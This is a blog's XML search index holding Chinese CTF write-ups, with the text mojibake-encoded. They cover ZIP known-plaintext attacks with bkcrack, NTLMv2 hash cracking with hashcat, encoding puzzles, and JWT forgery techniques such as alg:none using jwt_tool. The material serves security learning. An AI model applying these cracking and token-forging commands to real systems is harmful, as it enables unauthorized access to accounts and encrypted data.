<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ˜æ–‡æ”»å‡»</title>
      <link href="/2024/11/30/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/"/>
      <url>/2024/11/30/%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="secrect-zip"><a href="#secrect-zip" class="headerlink" title="secrect.zip"></a>secrect.zip</h3><p>è§£é¢˜æ€è·¯ï¼šæ˜æ–‡æ”»å‡»-&gt;å­—é¢‘ç»Ÿè®¡</p><p>hintæç¤ºï¼šè½¯ä»¶ï¼š7-zip</p><p>æˆ‘è¿˜æ˜¯è¯•è¯•äº†bandzipï¼Œ2345å‹ç¼©ï¼Œå…¶å®è¿˜æ˜¯ä¸è¡Œï¼Œä½¿ç”¨360å‹ç¼©å³å¯ï¼Œ7-zipåº”è¯¥ä¹Ÿè¡Œï¼Œä¸è¿‡æ²¡ä¸‹ï¼Œæ¡€æ¡€æ¡€</p><p><img src="/img/1732528273759-2.png" alt="img"></p><p>è§£å‹ä¹‹åä¸º1.txtè¿›è¡Œå­—é¢‘ç»Ÿè®¡å³å¯</p><p><img src="/img/1732528273759-1.png" alt="img"></p><p>flag{EdCvGyTr@95173}</p><h3 id="æ˜æ–‡æ”»å‡»"><a href="#æ˜æ–‡æ”»å‡»" class="headerlink" title="æ˜æ–‡æ”»å‡»"></a>æ˜æ–‡æ”»å‡»</h3><p>æ–‡ä»¶è¾ƒå¤§æ—¶ï¼Œé‰´äºARCHPRçˆ†ç ´æ—¶é—´ä¸€èˆ¬ä¸ä½äº20åˆ†é’Ÿï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸é‡‡ç”¨å®ƒè¿›è¡Œæ˜æ–‡æ”»å‡»çˆ†ç ´</p><p>è¿›è¡Œæ˜æ–‡æ”»å‡»æ—¶éœ€è¦æ³¨æ„å‹ç¼©ç®—æ³•ä¸åŒï¼Œä¹Ÿä¼šé€ æˆçˆ†ç ´å¤±è´¥</p><p>ç¬¬äºŒç§è§£æ³•ï¼šbkcrackè¿›è¡Œçˆ†ç ´</p><p>bkcrackç”¨æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bkcrack -L 1.zip   //åˆ—å‡ºæ¡ç›®åç§°å’Œæ•°æ®</span><br><span class="line">bkcrack -L E:\miscå·¥å…·\bkcrack-1.6.1-win64\å°æ˜çš„æ—¥è®°æœ¬.zip</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241125213551022.png" alt="image-20241125213551022"></p><p>bkcrackè§£å‡ºå¯†é’¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C E:\miscå·¥å…·\bkcrack-1.6.1-win64\å°æ˜çš„æ—¥è®°æœ¬.zip -c d.jpg -P d.zip -p d.jpg</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241125214047596.png" alt="image-20241125214047596"></p><p>å› æ­¤å¯ä»¥å¾—å‡ºå¯†é’¥æ˜¯ï¼šde7fb7fe a8c68ae2 ddc4ba4b</p><p>åˆ°è¿™é‡Œä¸€èˆ¬2æ­¥å¯ä»¥ç”¨ARCHPRæ¥è§£ï¼Œä¹Ÿå¯ä»¥ç”¨bkcrackæ¥è§£,ä½¿ç”¨å¯†é’¥è§£å‡ºï¼Œè®¾ç½®ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¹¶å°†å¯†ç è®¾ç½®ä¸ºkunkun</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bkcrack -C E:\miscå·¥å…·\bkcrack-1.6.1-win64\å°æ˜çš„æ—¥è®°æœ¬.zip -c d.jpg -k de7fb7fe a8c68ae2 ddc4ba4b -U kun.zip kunkun</span><br></pre></td></tr></table></figure><p>ä¾‹é¢˜ï¼š</p><h3 id="è°å·åƒäº†æˆ‘çš„å¤–å–ã€æ˜¥ç§‹æ¯ã€‘"><a href="#è°å·åƒäº†æˆ‘çš„å¤–å–ã€æ˜¥ç§‹æ¯ã€‘" class="headerlink" title="è°å·åƒäº†æˆ‘çš„å¤–å–ã€æ˜¥ç§‹æ¯ã€‘"></a>è°å·åƒäº†æˆ‘çš„å¤–å–ã€æ˜¥ç§‹æ¯ã€‘</h3><p> ä¸‹è½½é™„ä»¶å¾—</p><p><img src="/img/1732547950682-5.jpeg" alt="img"></p><p>binwalkå°è¯•æ— æœï¼Œé€‰ç”¨foremostè¿›è¡Œåˆ†ç¦»ï¼Œå¾—åˆ°å‹ç¼©åŒ…</p><p><img src="/img/1732547950676-1.png" alt="img"></p><p>è¿™é‡Œæœ‰è®¸å¤šå¤–å–å•åŠç”¨æˆ·å</p><p><img src="/img/1732547950676-2.png" alt="img"></p><p>ç”¨æˆ·åä¸­é—´çš„æ•°æ®æå–å‡ºæ¥æŒ‰ç…§ç”¨æˆ·åé¡ºåºæ‹¼æ¥èµ·æ¥ï¼Œåƒæ˜¯<code>base64</code>ï¼Œä½†æ˜¯<code>base64</code>çš„å¡«å……ç¬¦å·æ²¡æœ‰<code>-</code>ï¼Œåªæœ‰<code>+</code>ã€<code>/</code>ï¼Œ<code>+</code>è¿™é‡Œæœ‰äº†ï¼Œæ ¹æ®æç¤ºçŒœæµ‹æŠŠ<code>-</code>æ›¿æ¢æˆ<code>/</code>ï¼Œå¾—åˆ°çš„è§£ç æ˜¯zipæ•°æ®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(<span class="string">&quot;C:\\Users\jiang\\Desktop\\å¤–å–ç®±.zip&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">    fileNameList = zf.namelist()</span><br><span class="line">    infoDict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> fileName <span class="keyword">in</span> fileNameList:</span><br><span class="line">        matchedData = re.findall(<span class="string">r&#x27;\d&#123;1,&#125;_[a-zA-Z0-9-+=\/]&#123;4&#125;&#x27;</span>, fileName)</span><br><span class="line">        <span class="keyword">if</span> matchedData != []:</span><br><span class="line">            infoDict[matchedData[<span class="number">0</span>][<span class="number">0</span>:matchedData[<span class="number">0</span>].find(<span class="string">&#x27;_&#x27;</span>)]] = matchedData[<span class="number">0</span>][matchedData[<span class="number">0</span>].find(<span class="string">&#x27;_&#x27;</span>) + <span class="number">1</span>:]</span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10898</span> + <span class="number">1</span>):</span><br><span class="line">        content += infoDict[<span class="built_in">str</span>(idx)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:\\Users\jiang\\Desktop\\data.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(base64.b64decode(content.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)))</span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æ</p><p>è§£å‹ç¼©ä¸€ä¸ªåä¸ºâ€å¤–å–ç®±.zipâ€çš„æ–‡ä»¶ï¼Œå¹¶ä»ä¸­æå–ç‰¹å®šæ–‡ä»¶çš„å†…å®¹ã€‚è§£å‹åçš„æ–‡ä»¶å†…å®¹æŒ‰ç…§ç‰¹å®šçš„å‘½åè§„åˆ™è¿›è¡Œæå–ï¼Œå¹¶å­˜å‚¨åœ¨ä¸€ä¸ªå­—å…¸å˜é‡<code>infoDict</code>ä¸­ã€‚ç„¶åï¼Œé€šè¿‡å¾ªç¯éå†å­—å…¸ä¸­çš„å†…å®¹ï¼Œå°†ç‰¹å®šæ–‡ä»¶çš„å†…å®¹ä»¥base64ç¼–ç çš„å½¢å¼å†™å…¥ä¸€ä¸ªåä¸ºâ€data.zipâ€çš„æ–‡ä»¶ä¸­</p><p>æ”¾å…¥010é‡Œå‘ç°æ–‡ä»¶å¤´ç¼ºå¤±ï¼Œè¡¥å…¨æ–‡ä»¶å¤´</p><p><img src="/img/1732547950676-3.png" alt="img"></p><p>æ­¤æ—¶å¾—åˆ°flag1</p><p>ğŸŒŸ flag{W1sh_y0u_AaaAaaaağŸŒŸ </p><p>æ ¹æ®é’¥åŒ™çš„æç¤ºï¼Œå¯ä»¥æƒ³åˆ°æ˜æ–‡æ”»å‡»</p><p><img src="/img/1732547950676-4.png" alt="img"></p><p>ä¹‹åå¾—åˆ°è§£å¯†çš„å‹ç¼©åŒ…</p><p>è·å–å¦ä¸€åŠflag</p><p>}9enruoj_FTC_1ufredn0w_aaaaaaa</p><p>é€†åº</p><p>aaaaaaa_w0nderfu1_CTF_journe9}</p><p>flag{W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜</title>
      <link href="/2024/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
      <url>/2024/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h2><p>base64è§£å¯†ï¼Œå‘ç°16è¿›åˆ¶é€†åº</p><p><img src="/img/image-20241123160643614.png" alt="image-20241123160643614"></p><p>jpgå®½é«˜ä¿®æ”¹ï¼Œè¿™é‡Œä¿®æ”¹å®½å°†02 80 02 20 æ”¹ä¸º02 80 02 80å³å¯</p><p><img src="/img/image-20241123161029393.png" alt="image-20241123161029393"></p><p><img src="/img/download-1732349601955-2.jpg" alt="download"></p><h2 id="èˆ”ç‹—çš„è§‰é†’"><a href="#èˆ”ç‹—çš„è§‰é†’" class="headerlink" title="èˆ”ç‹—çš„è§‰é†’"></a>èˆ”ç‹—çš„è§‰é†’</h2><p>8ä½æ•°å­—çˆ†ç ´</p><p><img src="/img/image-20241123161641715.png" alt="image-20241123161641715"></p><p>ç›¸é‚»çš„å­—èŠ‚åè½¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;byte-revenge.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split()</span><br><span class="line"></span><br><span class="line">result =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    res = i[::-<span class="number">1</span>]</span><br><span class="line">    result += res</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">swapped_data = [byte[::-<span class="number">1</span>] <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;&quot;</span>.join(result))</span><br></pre></td></tr></table></figure><p>ä¿å­˜ä¸º1.zip,æ‰“å¼€ä¹‹åæœ‰ä¸€ä¸ªpdfæ–‡ä»¶,pdfè½¬pptç§»åŠ¨å›¾ç‰‡å³å¯</p><p><img src="/img/image-20241123163112890.png" alt="image-20241123163112890"></p><h2 id="Sercet-Of-Starven"><a href="#Sercet-Of-Starven" class="headerlink" title="Sercet Of Starven"></a>Sercet Of Starven</h2><p>NTLMåè®®</p><p>NTML å…¨ç§° <strong>New Technology LAN Manager</strong>ï¼Œæ˜¯å¾®è½¯æä¾›çš„ä¸€ç»„å®‰å…¨åè®®ï¼Œç”¨æ¥è®¤è¯ç”¨æˆ·èº«ä»½ã€‚å®ƒæ˜¯ä¸€ä¸ªåŸºäº è´¨è¯¢å“åº” çš„åè®®ï¼Œåœ¨éªŒè¯ç”¨æˆ·çš„è¿‡ç¨‹ä¸­ä¸éœ€è¦ä¼ è¾“ç”¨æˆ·çš„æ˜æ–‡å¯†ç </p><p>è®¤è¯è¿‡ç¨‹åŸºäº è´¨è¯¢&#x2F;å“åº” challenge&#x2F;response</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>è¿‡æ»¤smb2ï¼Œé•¿åº¦ä¸º401çš„åŒ…æ‰¾åˆ°Challenge</p><p><img src="/img/image-20241123202144603.png" alt="image-20241123202144603"></p><p>Challenge:9a35e37a04717230</p><p><img src="/img/image-20241123202412107.png" alt="image-20241123202412107"></p><p>åœ¨é•¿åº¦ä¸º705çš„åŒ…ä¸­æœ‰response:189bf0b02d2f766af2242dc455ad4fe10101000000000000ca1f069a8a09db01980131a514a3d32d0000000002001e004400450053004b0054004f0050002d00510032004200390044004900410001001e004400450053004b0054004f0050002d00510032004200390044004900410004001e004400450053004b0054004f0050002d00510032004200390044004900410003001e004400450053004b0054004f0050002d00510032004200390044004900410007000800ca1f069a8a09db010600040002000000080030003000000000000000010000000020000044063d2e3ec53e332816d81a43ec5914e72ef2dc0599bfa08788e043eb523af80a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310031002e00320030000000000000000000</p><p>Username:Starven</p><p>Domain name:192.168.11.20</p><p>æ‹¼æ¥NTMLæ ¼å¼ï¼šï¼ˆæ³¨æ„æ•°æ®é¡ºåºå’Œå»æ‰é‡å¤é¡ºåºï¼‰</p><p>Starven::192.168.11.20:9a35e37a04717230:189bf0b02d2f766af2242dc455ad4fe1:0101000000000000ca1f069a8a09db01980131a514a3d32d0000000002001e004400450053004b0054004f0050002d00510032004200390044004900410001001e004400450053004b0054004f0050002d00510032004200390044004900410004001e004400450053004b0054004f0050002d00510032004200390044004900410003001e004400450053004b0054004f0050002d00510032004200390044004900410007000800ca1f069a8a09db010600040002000000080030003000000000000000010000000020000044063d2e3ec53e332816d81a43ec5914e72ef2dc0599bfa08788e043eb523af80a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310031002e00320030000000000000000000</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -O -a 0 -m 5600 starven.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20241123211919342.png" alt="image-20241123211919342"></p><p>å‹ç¼©åŒ…å¯†ç ï¼šspellorstarve</p><p>SYC{D0n7_spre0d_St@rvenâ€™s_s3crEt}</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾¡ç½‘æ¯</title>
      <link href="/2024/09/22/%E5%BE%A1%E7%BD%91%E6%9D%AF/"/>
      <url>/2024/09/22/%E5%BE%A1%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹:wordéšå†™</p><p>wpsæ‰“å¼€ï¼Œctrl+Aå…¨é€‰ï¼Œè°ƒæ¢é¢œè‰²å³å¯</p><p><img src="/img/image-20240922181239546.png" alt="image-20240922181239546"></p><p>flag{HNCTF9090AS9nbg87600hn77hn88}</p><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹</p><p>ç¼–ç 1ï¼šBrainFuckè§£ç </p><p><img src="/img/image-20240922202913546.png" alt="image-20240922202913546"></p><p>ç¼–ç 2ï¼šJSFuckç¼–ç </p><p><img src="/img/image-20240922203024347.png" alt="image-20240922203024347"></p><p>ç¼–ç 3ï¼šookè§£å¯†</p><p>åœ¨çº¿ç½‘å€ï¼š[Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding <a href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p><p><img src="/img/image-20240922203218375.png" alt="image-20240922203218375"></p><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>åˆ†ç»„å­—èŠ‚æµæœç´¢flag,æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨é•¿åº¦ä¸º337ï¼Œ349ï¼Œ85çš„åŒ…é‡Œæœç´¢åˆ°flag</p><p><img src="/img/image-20240922225311013.png" alt="image-20240922225311013"></p><p><img src="/img/image-20240922225334650.png" alt="image-20240922225334650"></p><p>æå–å…¶16è¿›åˆ¶ï¼Œä¿å­˜ä¸ºå‹ç¼©åŒ…ï¼Œæ‰“å¼€æˆ‘ä»¬å¯ä»¥å‘ç°flag.txtå’Œkey</p><p>flag:</p><p>10004583275926070044326083910251708233320797779355779208703097816305188140191914132269450797</p><p>4e94dcdb6de87e65d263419ec45aec93e8a2e1d386b31fb804e0f02366df44dbe86a8a7c462d</p><p>key</p><p>5216294695211820293806247029887026154798297270637676463374801674229881314620340407569315152</p><p>28f8bdbc16de4850e05579acf33c8aa08ac3d9e6e3822b8c3081c04700eb25b88a08eb457550</p><p>è½¬16è¿›åˆ¶è¿›è¡ŒXORå¼‚æˆ–</p><p><img src="/img/image-20240926194610800.png" alt="image-20240926194610800"></p><p>flag{66526827ff3ba85e1444a0df4acbba93}</p><h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#x39;&amp;#x33;&amp;#x36;&amp;#x35;&amp;#x34;&amp;#x34;&amp;#x61;&amp;#x35;&amp;#x35;&amp;#x33;&amp;#x31;&amp;#x34;&amp;#x61;&amp;#x37;&amp;#x65;&amp;#x34;&amp;#x33;&amp;#x33;&amp;#x39;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x66;&amp;#x34;&amp;#x37;&amp;#x37;&amp;#x37;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x65;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x31;&amp;#x35;&amp;#x61;&amp;#x37;&amp;#x64;&amp;#x34;&amp;#x31;&amp;#x33;&amp;#x32;&amp;#x35;&amp;#x37;&amp;#x34;&amp;#x33;&amp;#x35;&amp;#x37;&amp;#x35;&amp;#x36;&amp;#x35;&amp;#x35;&amp;#x34;&amp;#x35;&amp;#x35;&amp;#x62;&amp;#x34;&amp;#x34;&amp;#x37;&amp;#x38;&amp;#x35;&amp;#x31;&amp;#x36;&amp;#x61;&amp;#x36;&amp;#x35;&amp;#x33;&amp;#x37;&amp;#x34;&amp;#x31;&amp;#x36;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„ä¸€æ®µunicodeè§£ç ï¼Œéšæ³¢é€æµè§£ç å¾—</p><p><img src="/img/image-20240922203522270.png" alt="image-20240922203522270"></p><p>936544a55314a7e4339545f47776a6e41315a7d41325743575655455b4478516a6537416</p><p>é€†åºå¾—ï¼š6147356a6158744b55455657534752314d7a51314e6a67774f5459334e7a41355a445639</p><p>16æœºåˆ¶è½¬asciiå¯å¾—</p><p><img src="/img/image-20240922203708424.png" alt="image-20240922203708424"></p><p>aG5jaXtKUEVWSGR1MzQ1NjgwOTY3NzA5ZDV9</p><p>base64è§£å¯†</p><p><img src="/img/image-20240922203747729.png" alt="image-20240922203747729"></p><p>hnci{JPEVHdu345680967709d5}</p><p>å¯ä»¥è§‚å¯Ÿåˆ°hnciä¸flagä¹‹é—´hå‘åé€€äº†2æ ¼ï¼Œæ ¹æ®f-&gt;h,l-&gt;n,a-&gt;c,g-&gt;i</p><p>æˆ‘ä»¬å¯ä»¥å¾—å‡ºflag</p><p>flag{HNCTFbs345680967709b5}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWTæ¼æ´åˆ©ç”¨</title>
      <link href="/2024/09/19/JWT%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2024/09/19/JWT%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="JWTæ¼æ´åˆ†æ"><a href="#JWTæ¼æ´åˆ†æ" class="headerlink" title="JWTæ¼æ´åˆ†æ"></a>JWTæ¼æ´åˆ†æ</h2><p>JWTè®¤è¯æ”»å‡»è¯¦ç»†è§£ç­”:<a href="https://www.cnblogs.com/backlion/p/16699442.html">https://www.cnblogs.com/backlion/p/16699442.html</a></p><p>åœ¨çº¿åˆ©ç”¨å·¥å…·ï¼š<a href="https://jwt.io/">https://jwt.io/</a></p><p>jwtå·¥å…·ï¼š<a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p><p>åŸºç¡€ä½¿ç”¨ï¼špython3 jwt_tool.py jwt</p><p>è¦è¿è¡Œç‰¹å®šç±»å‹çš„æ¼æ´åˆ©ç”¨ï¼Œæ‚¨éœ€è¦é€‰æ‹© eXploit (-X) é€‰é¡¹å¹¶é€‰æ‹©æ¼æ´ï¼ˆæ­¤å¤„ä½¿ç”¨â€œaâ€è¡¨ç¤º<em>alg:none</em>æ¼æ´åˆ©ç”¨ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X a</span><br></pre></td></tr></table></figure><h3 id="1-JWTçš„ç®€ä»‹"><a href="#1-JWTçš„ç®€ä»‹" class="headerlink" title="1.JWTçš„ç®€ä»‹"></a>1.JWTçš„ç®€ä»‹</h3><p>JWTå…¨ç§°ä¸ºjson web token å°†jsonå¯¹è±¡ä½œä¸ºè½½ä½“è¿›è¡Œä¼ è¾“ä¿¡æ¯ï¼Œé€šå¸¸ç”¨äºèº«ä»½è®¤è¯å’Œä¿¡æ¯äº¤æ¢ã€‚JWTå¯ä»¥ä½¿ç”¨å¯†é’¥(HMACç®—æ³•)æˆ–è€…ä½¿ç”¨RSAæˆ–ECDSAçš„å…¬é’¥&#x2F;ç§é’¥å¯¹è‡ªèº«è¿›è¡Œç­¾å</p><h3 id="2-JWTçš„æ ¼å¼"><a href="#2-JWTçš„æ ¼å¼" class="headerlink" title="2:JWTçš„æ ¼å¼"></a>2:JWTçš„æ ¼å¼</h3><p>æ¯å½“ç”¨æˆ·è®¿é—®ç«™ç‚¹ä¸­çš„èµ„æºæ—¶ï¼Œå¯¹åº”çš„è¯·æ±‚å¤´è®¤è¯é»˜è®¤ä¸ºAuthorization:jwt JWTä»¤ç‰Œè®¤è¯ä»¥eyjå¼€å¤´</p><p>JWTçš„æ•°æ®å¤´éƒ¨å¦‚ä¸‹ï¼š</p><p>JWTçš„æ•°æ®åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šå¤´éƒ¨(header),æœ‰æ•ˆè½½è·(Payload),ç­¾å(Signature)</p><p>ä¸‰ä¸ªéƒ¨åˆ†ä»¥è‹±æ–‡é€—å·éš”å¼€ï¼ŒJWTçš„å†…å®¹ä»¥base64è¿›è¡Œç¼–ç </p><p>ä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š</p><p>(1):å¤´éƒ¨ä¿¡æ¯åŒ…å«äº†JWTçš„é…ç½®æ–¹é¢ï¼Œä¾‹å¦‚ç­¾åç®—æ³•(alg)ï¼Œä»¤ç‰Œç±»å‹(JWT)å’ŒåŠ å¯†ç®—æ³•(alg)æˆ–è€…ç®—æ³•ä½¿ç”¨çš„å¯†é’¥æ–‡ä»¶</p><p>Head:eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ</p><p>{â€œkidâ€:â€keys&#x2F;3c3c2ea1c3f113f649dc9389dd71b851â€,â€typâ€:â€JWTâ€,â€algâ€:â€RS256â€}</p><p>(2):æœ‰æ•ˆè½½è·</p><p>æœ‰æ•ˆè½½è·ç”¨äºå­˜å‚¨ç”¨æˆ·çš„æ•°æ®ï¼Œä¾‹å¦‚ç”¨æˆ·å(test123)</p><p>payloadï¼šeyJzdWIiOiJkdWJoZTEyMyJ9</p><p>{â€œsubâ€:â€dubhe123â€}</p><p>(3):ç­¾å</p><p>Signature éœ€è¦ä½¿ç”¨ç¼–ç åçš„headerå’Œpayloadä»¥åŠæˆ‘ä»¬æä¾›çš„ä¸€ä¸ªå¯†é’¥ï¼Œç„¶åä½¿ç”¨headerä¸­æŒ‡å®šçš„ç­¾åç®—æ³•é€šå¸¸æ˜¯RS256(RSAéå¯¹ç§°åŠ å¯†å’Œç§é’¥ç­¾å)å’ŒHS256(HMAC SHA256å¯¹ç§°åŠ å¯†)ç®—æ³•è¿›è¡Œç­¾åï¼Œç­¾åçš„ä½œç”¨æ˜¯ä¿è¯jwtæ²¡æœ‰è¢«ç¯¡æ”¹è¿‡</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨HS256ç”ŸæˆJw&#x3D;WTçš„ä»£ç ä¾‹å­</p><p>HMACSHA256(base64Encode(header) + â€œ.â€ + base64urlEncode(payload),secret)</p><p>Signature:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XicP4pq_WIF2bAVtPmAlWIvAUad_eeBhDOQe2MXwHrE8a7930LlfQq1lFqBs0wLMhht6Z9BQXBRos9jvQ7eumEUFWFYKRZfu9POTOEE79wxNwTxGdHc5VidvrwiytkRMtGKIyhbv68duFPI68Qnzh0z0M7t5LkEDvNivfOrxdxwb7IQsAuenKzF67Z6UArbZE8odNZAA9IYaWHeh1b4OUG0OPM3saXYSG-Q1R5X_5nlWogHHYwy2kD9v4nk1BaQ5kHJIl8B3Nc77gVIIVvzI9N_klPcX5xsuw9SsUfr9d99kaKyMUSXxeiZVM-7os_dw3ttz2f-TJSNI0DYprHHLFw</span><br></pre></td></tr></table></figure><h3 id="3-JWTå¸¸è§å®‰å…¨é—®é¢˜"><a href="#3-JWTå¸¸è§å®‰å…¨é—®é¢˜" class="headerlink" title="3:JWTå¸¸è§å®‰å…¨é—®é¢˜"></a>3:JWTå¸¸è§å®‰å…¨é—®é¢˜</h3><p>1ï¼šç­¾åç®—æ³•å¯è¢«ä¿®æ”¹ä¸ºnone(CVE-2015-9235)</p><p>JWTæ”¯æŒç®—æ³•è®¾å®šä¸ºâ€œNoneâ€,å¦‚æœâ€œalgâ€å­—æ®µè®¾ä¸ºâ€œNoneâ€,é‚£ä¹ˆç­¾åä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·çš„ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„</p><p>2ï¼šæœªæ ¡éªŒç­¾å</p><p>æŸäº›æœåŠ¡ç«¯å¹¶æœªæ ¡éªŒJWTç­¾åï¼Œå¯ä»¥å°è¯•ä¿®æ”¹payloadåç„¶åç›´æ¥è¯·æ±‚tokenæˆ–è€…ç›´æ¥åˆ é™¤signatureå†æ¬¡è¯·æ±‚æŸ¥çœ‹å…¶æ˜¯å¦è¿˜æœ‰æ•ˆã€‚</p><p>é€šè¿‡åœ¨çº¿å·¥å…·jwt.ioä¿®æ”¹payloadæ•°æ®</p><p>3ï¼šJWKSå…¬é’¥ æ³¨å…¥ â€”â€”ä¼ªé€ å¯†é’¥(CVE-2018-0114)</p><p>åˆ›å»ºä¸€ä¸ªæ–°çš„ RSA è¯ä¹¦å¯¹ï¼Œæ³¨å…¥ä¸€ä¸ª JWKS æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ–°çš„ç§é’¥å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œå°†å…¬é’¥åŒ…å«åœ¨ä»¤ç‰Œä¸­ï¼Œç„¶åè®©æœåŠ¡ä½¿ç”¨è¯¥å¯†é’¥æ¥éªŒè¯ä»¤ç‰Œ</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥ä¼ªé€ JWTï¼šåˆ é™¤åŸå§‹ç­¾åï¼Œå‘æ ‡å¤´æ·»åŠ æ–°çš„å…¬é’¥ï¼Œç„¶åä½¿ç”¨ä¸è¯¥å…¬é’¥å…³è”çš„ç§é’¥è¿›è¡Œç­¾åã€‚</p><p>4ï¼šç©ºç­¾å(CVE-2020-28042)</p><p>ä»ä»¤ç‰Œæœ«å°¾åˆ é™¤ç­¾å</p><p>5ï¼šæ•æ„Ÿä¿¡æ¯æ³„éœ²</p><p>JWTçš„headerå¤´base64è§£ç å¯æ³„éœ²æ•æ„Ÿæ•°æ®å¦‚å¯†é’¥æ–‡ä»¶æˆ–è€…å¯†ç æˆ–è€…æ³¨å…¥æ¼æ´</p><p>6ï¼šKIDå‚æ•°æ¼æ´</p><h3 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h3><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼šsessionä¼ªé€ 